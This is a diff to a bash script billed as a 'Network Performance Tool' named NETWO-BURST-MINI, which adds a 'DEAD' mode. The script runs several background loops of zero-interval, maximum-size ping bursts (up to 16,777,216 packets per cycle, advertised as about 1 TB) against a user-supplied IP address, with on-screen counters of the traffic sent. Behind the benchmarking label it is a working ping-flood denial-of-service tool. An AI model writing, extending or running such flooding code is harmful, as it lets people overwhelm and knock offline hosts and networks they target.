@@ -97,9 +97,9 @@ sleep 0.3
 echo -e "${RED}${BOLD}"
 cat << "EOF"
 ╔═══════════════════════════════════════════╗
-║     NETWO-BURST-MINI v1.0                 ║
+║     NETWO-BURST-MINI v2.0                   ║
 ║     Network Performance Tool              ║
-║     By: DoggoJ (UwURaww)                  ║
+║     By: DoggoJ (UwURaww)                    ║
 ╚═══════════════════════════════════════════╝
 EOF
 echo -e "${NC}\n"
@@ -306,8 +306,9 @@ case $ip_option in
         echo -e "${YELLOW}2${NC}) Medium      ${DIM}(Moderate)${NC}"
         echo -e "${RED}3${NC}) Hell Yeah!  ${DIM}(Intense)${NC}"
         echo -e "${RED}${BOLD}4${NC}) Doomed      ${DIM}(MAXIMUM)${NC}"
+        echo -e "${RED}${BOLD}${BLINK}5${NC}) 💀 DEAD 💀    ${DIM}(APOCALYPSE - 1TB TARGET)${NC}"
         echo ""
-        read -p "$(echo -e ${WHITE}'Level [1-4]: '${NC})" level
+        read -p "$(echo -e ${WHITE}'Level [1-5]: '${NC})" level
         
         case $level in
             1)
@@ -333,6 +334,28 @@ case $ip_option in
                 PACKET_SIZE=65027
                 INTERVAL=0
                 BURST_COUNT=500
+                ;;
+            5)
+                LEVEL_NAME="${RED}${BOLD}${BLINK}💀 DEAD 💀${NC}"
+                PACKET_SIZE=65027
+                INTERVAL=0
+                BURST_COUNT=2000
+                
+                echo -e "\n${RED}${BOLD}╔═══════════════════════════════════════════╗${NC}"
+                echo -e "${RED}${BOLD}║  ⚠️  EXTREME WARNING - DEAD MODE  ⚠️       ║${NC}"
+                echo -e "${RED}${BOLD}╚═══════════════════════════════════════════╝${NC}"
+                echo -e "${YELLOW}Target: Send 1 TERABYTE of data${NC}"
+                echo -e "${YELLOW}This will use MAXIMUM system resources!${NC}"
+                echo -e "${RED}${BLINK}THIS MAY CRASH YOUR SYSTEM OR NETWORK!${NC}\n"
+                
+                read -p "$(echo -e ${RED}${BOLD}'Type DEAD to confirm: '${NC})" confirm
+                if [ "$confirm" != "DEAD" ]; then
+                    echo -e "${YELLOW}[!] Cancelled. Switching to Doomed mode...${NC}"
+                    LEVEL_NAME="${RED}${BOLD}${BLINK}DOOMED${NC}"
+                    PACKET_SIZE=65027
+                    INTERVAL=0
+                    BURST_COUNT=500
+                fi
                 ;;
             *)
                 echo -e "${RED}[✗] Invalid level${NC}"
@@ -491,8 +514,9 @@ echo -e "${GREEN}1${NC}) Normal      ${DIM}(Safe)${NC}"
 echo -e "${YELLOW}2${NC}) Medium      ${DIM}(Moderate)${NC}"
 echo -e "${RED}3${NC}) Hell Yeah!  ${DIM}(Intense)${NC}"
 echo -e "${RED}${BOLD}4${NC}) Doomed      ${DIM}(MAXIMUM)${NC}"
+echo -e "${RED}${BOLD}${BLINK}5${NC}) 💀 DEAD 💀    ${DIM}(APOCALYPSE - 1TB TARGET)${NC}"
 echo ""
-read -p "$(echo -e ${WHITE}'Level [1-4]: '${NC})" level
+read -p "$(echo -e ${WHITE}'Level [1-5]: '${NC})" level
 
 case $level in
     1)
@@ -518,6 +542,31 @@ case $level in
         PACKET_SIZE=65027
         INTERVAL=0
         BURST_COUNT=500
+        ;;
+    5)
+        LEVEL_NAME="${RED}${BOLD}${BLINK}💀 DEAD 💀${NC}"
+        PACKET_SIZE=65027
+        INTERVAL=0
+        BURST_COUNT=16777216
+        DEAD_MODE=true
+        
+        echo -e "\n${RED}${BOLD}╔═══════════════════════════════════════════╗${NC}"
+        echo -e "${RED}${BOLD}║  ⚠️  EXTREME WARNING - DEAD MODE  ⚠️       ║${NC}"
+        echo -e "${RED}${BOLD}╚═══════════════════════════════════════════╝${NC}"
+        echo -e "${YELLOW}Each cycle sends: 1 TERABYTE of data${NC}"
+        echo -e "${YELLOW}Burst: 16,777,216 packets × 65KB = ~1TB${NC}"
+        echo -e "${YELLOW}This will use MAXIMUM system resources!${NC}"
+        echo -e "${RED}${BLINK}THIS MAY CRASH YOUR SYSTEM OR NETWORK!${NC}\n"
+        
+        read -p "$(echo -e ${RED}${BOLD}'Type DEAD to confirm: '${NC})" confirm
+        if [ "$confirm" != "DEAD" ]; then
+            echo -e "${YELLOW}[!] Cancelled. Switching to Doomed mode...${NC}"
+            LEVEL_NAME="${RED}${BOLD}${BLINK}DOOMED${NC}"
+            PACKET_SIZE=65027
+            INTERVAL=0
+            BURST_COUNT=500
+            DEAD_MODE=false
+        fi
         ;;
     *)
         echo -e "${RED}[✗] Invalid level${NC}"
@@ -572,15 +621,25 @@ cleanup() {
 
 trap cleanup SIGINT SIGTERM
 
+if [ "${DEAD_MODE:-false}" = true ]; then
+    echo -e "${RED}${BOLD}[!] DEAD MODE: 1 TB per cycle${NC}"
+    echo -e "${YELLOW}[*] Each burst = 16,777,216 packets × 65KB ≈ 1 TB${NC}"
+    echo -e "${RED}${BLINK}[!] EXTREME NETWORK LOAD - USE WITH CAUTION!${NC}\n"
+fi
+
 for i in $(seq 1 $instances); do
     (
         count=0
+        cycles=0
         echo "0" > "$LOG_DIR/count_$i"
+        echo "0" > "$LOG_DIR/cycles_$i"
         
         while true; do
             ping -i $INTERVAL -c $BURST_COUNT -s $PACKET_SIZE -W 1 $ip &>/dev/null
             count=$((count + BURST_COUNT))
+            cycles=$((cycles + 1))
             echo "$count" > "$LOG_DIR/count_$i"
+            echo "$cycles" > "$LOG_DIR/cycles_$i"
         done
     ) &
     pids+=($!)
@@ -597,9 +656,12 @@ while true; do
     elapsed=$((now - start))
     
     total=0
+    total_cycles=0
     for i in $(seq 1 $instances); do
         count=$(cat "$LOG_DIR/count_$i" 2>/dev/null || echo "0")
+        cycles=$(cat "$LOG_DIR/cycles_$i" 2>/dev/null || echo "0")
         total=$((total + count))
+        total_cycles=$((total_cycles + cycles))
     done
     
     if [ $elapsed -gt 0 ]; then
@@ -618,19 +680,37 @@ while true; do
     echo -e "${WHITE}Instances:${NC}    ${CYAN}$instances${NC}"
     echo -e "${WHITE}Uptime:${NC}       ${GREEN}${elapsed}s${NC}"
     echo -e "${WHITE}Total Pkts:${NC}   ${YELLOW}${BOLD}$total${NC}"
-    echo -e "${WHITE}Packets/sec:${NC}  ${YELLOW}${BOLD}$pps${NC}\n"
+    echo -e "${WHITE}Packets/sec:${NC}  ${YELLOW}${BOLD}$pps${NC}"
+    
+    if [ "${DEAD_MODE:-false}" = true ]; then
+        total_tb=$(awk "BEGIN {printf \"%.3f\", ($total * 65027) / 1099511627776}")
+        echo -e "${WHITE}Total Cycles:${NC} ${RED}${BOLD}$total_cycles${NC}"
+        echo -e "${WHITE}Data Sent:${NC}    ${RED}${BOLD}~${total_tb} TB${NC}"
+        echo -e "${YELLOW}[*] Each cycle ≈ 1 TB (16.7M packets × 65KB)${NC}"
+    fi
+    
+    echo ""
     
     for i in $(seq 1 $instances); do
         count=$(cat "$LOG_DIR/count_$i" 2>/dev/null || echo "0")
+        cycles=$(cat "$LOG_DIR/cycles_$i" 2>/dev/null || echo "0")
         bar=""
         filled=$((count % 20))
         for b in $(seq 1 20); do
             [ $b -le $filled ] && bar="${bar}${GREEN}█${NC}" || bar="${bar}${DIM}░${NC}"
         done
-        echo -e "${CYAN}#$i${NC} $bar ${WHITE}$count${NC}"
+        if [ "${DEAD_MODE:-false}" = true ]; then
+            echo -e "${CYAN}#$i${NC} $bar ${WHITE}$count${NC} ${DIM}(${cycles} cycles)${NC}"
+        else
+            echo -e "${CYAN}#$i${NC} $bar ${WHITE}$count${NC}"
+        fi
     done
     
-    echo -e "\n${RED}${BLINK}[!] RUNNING${NC} - Press Ctrl+C to stop"
+    if [ "${DEAD_MODE:-false}" = true ]; then
+        echo -e "\n${RED}${BOLD}${BLINK}[!] DEAD MODE ACTIVE${NC} - 1 TB per cycle"
+    else
+        echo -e "\n${RED}${BLINK}[!] RUNNING${NC} - Press Ctrl+C to stop"
+    fi
 done
 
 wait
